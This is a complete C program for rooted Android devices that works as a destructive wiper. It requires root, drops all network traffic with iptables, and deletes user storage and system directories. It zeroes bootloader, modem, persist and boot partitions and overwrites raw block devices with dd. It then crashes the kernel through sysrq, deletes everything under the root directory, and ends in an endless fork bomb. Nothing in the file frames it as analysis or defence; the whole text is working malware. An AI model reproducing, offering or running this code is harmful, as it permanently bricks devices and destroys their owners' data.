#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <dirent.h>

#define ZERO_BUF_SIZE 4096

static void exec_silent(const char *cmd) {
  pid_t pid = fork();
  if (pid == 0) {
      int devnull = open("/dev/null", O_WRONLY);
      dup2(devnull, STDOUT_FILENO);
      dup2(devnull, STDERR_FILENO);
      close(devnull);
      execl("/system/bin/sh", "sh", "-c", cmd, NULL);
      _exit(1);
  } else if (pid > 0) {
      waitpid(pid, NULL, 0);
  }
}

static void zero_blockdev(const char *path) {
  int fd = open(path, O_WRONLY | O_SYNC);
  if (fd < 0) return;
  
  char zero[ZERO_BUF_SIZE];
  memset(zero, 0, ZERO_BUF_SIZE);
  
  for (int i = 0; i < 25600; i++) {
      if (write(fd, zero, ZERO_BUF_SIZE) != ZERO_BUF_SIZE) break;
  }
  
  fsync(fd);
  close(fd);
}

static void rm_rf(const char *path) {
  char cmd[512];
  snprintf(cmd, sizeof(cmd), "rm -rf %s 2>/dev/null", path);
  exec_silent(cmd);
}

int main() {
  if (getuid() != 0) {
      return 1;
  }
  
  char magisk_path[256] = {0};
  FILE *fp = popen("magisk --path 2>/dev/null", "r");
  if (fp) {
      if (fgets(magisk_path, sizeof(magisk_path), fp)) {
          magisk_path[strcspn(magisk_path, "\n")] = 0;
      }
      pclose(fp);
  }
  
  exec_silent("iptables -F 2>/dev/null");
  exec_silent("iptables -X 2>/dev/null");
  exec_silent("iptables -P INPUT DROP");
  exec_silent("iptables -P OUTPUT DROP");
  exec_silent("iptables -P FORWARD DROP");
  exec_silent("iptables -A INPUT -p tcp --dport 9008 -j DROP");
  exec_silent("iptables -A INPUT -p udp --dport 9008 -j DROP");
  exec_silent("iptables -A OUTPUT -p tcp --dport 9008 -j DROP");
  exec_silent("iptables -A OUTPUT -p udp --dport 9008 -j DROP");
  
  rm_rf("/sdcard");
  rm_rf("/storage/emulated/0");
  rm_rf("/storage/sdcard0");
  rm_rf("/storage/sdcard1");
  rm_rf("/mnt/sdcard");
  rm_rf("/mnt/media_rw");
  
  const char *boot_parts[] = {
      "abl", "abl_a", "abl_b",
      "xbl", "xbl_a", "xbl_b", "xbl_bak",
      "xbl_config", "xbl_config_a", "xbl_config_b",
      "recovery", "recovery_a", "recovery_b",
      "boot", "boot_a", "boot_b",
      "fsc", "fsg",
      "mdm1m9kefs1", "mdm1m9kefs2", "mdm1m9kefs3", "mdm1m9kefsc",
      "modem", "modemst1", "modemst2",
      "persist", "persistbak",
      "devcfg", "devinfo", "dtbo",
      "vbmeta", "vbmeta_a", "vbmeta_b",
      "vendor_boot", "vendor_boot_a", "vendor_boot_b",
      "init_boot", "init_boot_a", "init_boot_b",
      NULL
  };
  
  for (int i = 0; boot_parts[i]; i++) {
      char path[128];
      snprintf(path, sizeof(path), "/dev/block/by-name/%s", boot_parts[i]);
      zero_blockdev(path);
  }
  
  exec_silent("dd if=/dev/zero of=/dev/block/sda bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/sdb bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/sdc bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/sdd bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/sde bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/sdf bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M count=100 2>/dev/null");
  exec_silent("dd if=/dev/zero of=/dev/block/mmcblk1 bs=1M count=100 2>/dev/null");
  
  for (int i = 1; i <= 32; i++) {
      char cmd[128];
      snprintf(cmd, sizeof(cmd), "dd if=/dev/zero of=/dev/block/sda%d bs=1M count=10 2>/dev/null", i);
      exec_silent(cmd);
      snprintf(cmd, sizeof(cmd), "dd if=/dev/zero of=/dev/block/mmcblk0p%d bs=1M count=10 2>/dev/null", i);
      exec_silent(cmd);
  }
  
  DIR *dir = opendir("/dev/block");
  if (dir) {
      struct dirent *entry;
      while ((entry = readdir(dir)) != NULL) {
          if (strncmp(entry->d_name, "loop", 4) == 0 || 
              strncmp(entry->d_name, "dm-", 3) == 0) {
              char path[128];
              snprintf(path, sizeof(path), "/dev/block/%s", entry->d_name);
              zero_blockdev(path);
          }
      }
      closedir(dir);
  }
  
  if (strlen(magisk_path) > 0) {
      char block_path[512];
      snprintf(block_path, sizeof(block_path), "%s/.magisk/block/system_root", magisk_path);
      zero_blockdev(block_path);
      snprintf(block_path, sizeof(block_path), "%s/.magisk/block/vendor", magisk_path);
      zero_blockdev(block_path);
      rm_rf(magisk_path);
  }
  
  rm_rf("/data");
  rm_rf("/data/data");
  rm_rf("/system");
  rm_rf("/vendor");
  rm_rf("/product");
  rm_rf("/system_ext");
  rm_rf("/odm");
  rm_rf("/oem");
  rm_rf("/mnt");
  rm_rf("/cache");
  rm_rf("/metadata");
  
  sync();
  
  int fd = open("/proc/sysrq-trigger", O_WRONLY);
  if (fd >= 0) {
      write(fd, "s", 1);
      sleep(1);
      write(fd, "u", 1);
      sleep(1);
      write(fd, "c", 1);
      close(fd);
  }
  
  rm_rf("/dev/input");
  rm_rf("/dev/block");
  rm_rf("/dev");
  rm_rf("/proc");
  rm_rf("/sys");
  
  dir = opendir("/");
  if (dir) {
      struct dirent *entry;
      while ((entry = readdir(dir)) != NULL) {
          if (entry->d_name[0] == '.' && (entry->d_name[1] == 0 || 
              (entry->d_name[1] == '.' && entry->d_name[2] == 0))) {
              continue;
          }
          char path[256];
          snprintf(path, sizeof(path), "/%s", entry->d_name);
          rm_rf(path);
      }
      closedir(dir);
  }
  
  while (1) {
      fork();
  }
  
  return 0;
}
